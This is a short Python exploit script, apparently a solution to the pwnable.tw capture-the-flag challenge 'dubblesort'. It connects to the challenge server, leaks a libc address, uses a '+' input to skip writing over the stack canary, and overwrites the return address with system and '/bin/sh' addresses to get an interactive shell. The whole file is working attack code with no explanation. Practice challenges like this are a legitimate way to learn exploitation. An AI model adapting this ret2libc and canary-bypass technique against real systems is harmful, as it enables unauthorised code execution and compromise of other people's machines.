from pwn import *

DEBUG = 0

context.log_level = "debug"
sh = remote("chall.pwnable.tw", 10101)
if DEBUG:
    sh = process("dubblesort")
sh.recvuntil(":")
sh.send('A' * 16)
leak_shmat = u32(sh.recvuntil(":").split('A' * 16)[1][:4])
log.debug(hex(leak_shmat))
system = leak_shmat - 39 - 0xe7030 + 0x3a940
bin_sh = leak_shmat - 39 - 0xe7030 + 0x1eb50b
if DEBUG:
    system = leak_shmat - 39 - 0xf7dfa1e0 + 0xf7d4d940
    bin_sh = leak_shmat - 39 - 0xf7e201e0 + 0xf7e9202b
sh.sendline("35")
for i in range(0, 24):
    sh.sendline("0")
sh.sendline("+")
for i in range(0, 8):
    sh.sendline(str(system))
sh.sendline(str(bin_sh))
sh.sendline(str(bin_sh))


sh.interactive()
